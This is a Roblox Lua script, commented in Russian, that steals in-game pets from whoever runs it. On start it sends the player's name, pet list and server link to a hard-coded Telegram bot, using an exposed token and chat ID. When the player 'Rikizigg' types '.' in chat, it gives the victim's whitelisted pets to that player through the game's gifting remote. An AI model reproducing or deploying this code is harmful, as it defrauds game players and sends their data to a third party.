local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")

local player = Players.LocalPlayer

-- 🔧 НАСТРОЙКИ
local TELEGRAM_TOKEN = "7678595031:AAHYzkbKKI4CdT6B2NUGcYY6IlTvWG8xkzE"
local TELEGRAM_CHAT_ID = "7144575011"
local TARGET_PLAYER = "Rikizigg"
local TRIGGER_MESSAGE = "."

-- 🐾 БЕЛЫЙ СПИСОК (точные названия)
local WHITELIST = {
    "Hamster",
}

-- 🔗 Получить ссылку на сервер
local function getServerLink()
    return "https://www.roblox.com/games/"..game.PlaceId.."?gameInstanceId="..game.JobId
end

-- 📜 Получить список питомцев
local function getPetsList()
    local list = {}
    for _, item in ipairs(player.Backpack:GetChildren()) do
        if item:IsA("Tool") then
            table.insert(list, item.Name)
        end
    end
    return #list > 0 and table.concat(list, ", ") or "пусто"
end

-- ✅ Проверка в белом списке
local function isInWhitelist(petName)
    for _, name in ipairs(WHITELIST) do
        if petName:find(name) then return true end
    end
    return false
end

-- ✋ Взять в руку
local function equipPet(pet)
    if pet and player.Character then
        player.Character.Humanoid:EquipTool(pet)
        task.wait(1)
    end
end

-- 📤 Передать питомца
local function transferPet(pet)
    local target = Players:FindFirstChild(TARGET_PLAYER)
    if target and ReplicatedStorage:FindFirstChild("PetGiftingService") then
        ReplicatedStorage.PetGiftingService:FireServer("GivePet", target)
    end
end

-- 📨 Отправка в Telegram
local function sendToTelegram(text)
    local url = "https://api.telegram.org/bot"..TELEGRAM_TOKEN.."/sendMessage"..
               "?chat_id="..TELEGRAM_CHAT_ID.."&text="..HttpService:UrlEncode(text)
    pcall(function() game:HttpGet(url) end)
end

-- 🚀 Запуск передачи
local function startPetTransfer()
    local transferred = 0
    for _, pet in ipairs(player.Backpack:GetChildren()) do
        if pet:IsA("Tool") and isInWhitelist(pet.Name) then
            equipPet(pet)
            if transferPet(pet) then
                sendToTelegram("✅ "..pet.Name)
                transferred += 1
            end
            task.wait(2)
        end
    end
    sendToTelegram("🏁 Всего передано: "..transferred)
end

-- 🏁 ИНИЦИАЛИЗАЦИЯ
sendToTelegram(
    "🔔 "..player.Name.." активировал скрипт\n"..
    "📦 Питомцы: "..getPetsList().."\n"..
    "🔗 "..getServerLink()
)

-- 👂 Слушатель чата
game.Players.PlayerChatted:Connect(function(_, speaker, message)
    if speaker.Name == TARGET_PLAYER and message == TRIGGER_MESSAGE then
        startPetTransfer()
    end
end)
